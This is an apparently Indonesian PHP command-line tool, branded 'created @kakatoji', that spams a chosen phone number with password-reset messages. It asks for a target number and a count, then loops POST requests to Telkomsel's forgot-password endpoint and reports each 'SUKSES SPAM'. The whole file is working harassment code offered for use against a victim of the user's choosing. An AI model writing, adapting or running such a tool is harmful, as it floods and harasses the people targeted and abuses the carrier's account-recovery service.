<?php
error_reporting(0);
function post_0($no){
 $url="https://nsp.telkomsel.com/account/process/processlupapassword";
 $ua=array("User-Agent: Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36","Referer: https://nsp.telkomsel.com/account/lupapassword");
  $data="username=$no&action=&iswebview=false&fromaccount=false";
  $ch=curl_init();
curl_setopt_array($ch,array(
  CURLOPT_URL=>$url,
  CURLOPT_POST=>1,
  CURLOPT_POSTFIELDS=>$data,
  CURLOPT_RETURNTRANSFER=>1,
  CURLOPT_USERAGENT=>$ua,
  CURLOPT_TIMEOUT=>15,
  CURLOPT_CONNECTTIMEOUT=>15,
  CURLOPT_FOLLOWLOCATION=>1,));
$res=curl_exec($ch);
curl_close($ch);
return $res;
}
function ban(){
  $a='
 $$$$$$$\  $$$$$$\   $$$$$$\  $$$$$$\$$$$\  
$$  _____|$$  __$$\  \____$$\ $$  _$$  _$$\ 
\$$$$$$\  $$ /  $$ | $$$$$$$ |$$ / $$ / $$ |
 \____$$\ $$ |  $$ |$$  __$$ |$$ | $$ | $$ |
$$$$$$$  |$$$$$$$  |\$$$$$$$ |$$ | $$ | $$ |
\_______/ $$  ____/  \_______|\__| \__| \__|
          $$ |                              
          $$ |                              
          \__|                              
';
echo "\e[1;35m".$a."\e[0m\n";
echo "\e[1;45m".strtoupper('created @kakatoji')."\e[0m\n";
}
yt:
system('clear');
echo ban();
echo "\e[1;37m[\e[1;33m+\e[1;37m] \e[1;34mMASUKAN NO TARGET:\e[0m ";
$no=trim(fgets(STDIN));
echo "\e[1;37m[\e[1;33m+\e[1;37m] \e[1;34mMASUKAN JUMLAH SPAM:\e[0m ";
$jml=trim(fgets(STDIN));
$s=1;
for($i=0;$i<$jml;$i++){
$cek=post_0($no);
if(preg_match('/Reset Password Success./i',$cek)){
  echo "\e[1;37m[\e[1;33m".$s++."\e[1;37m] \e[1;32mSUKSES SPAM TO\e[1;37m => \e[1;36m$no\e[0m\n";
}else{
  echo "\e[1;37m[\e[1;33m+\e[1;37m] \e[1;31mGAGAL SPAM ERROR KONEKSI\e[0m\n";
 }
}
$e=readline("\e[1;33mLanjut y/n\e[0m ");
 if($e === "y" || $e === "Y"){
   goto yt;
 }
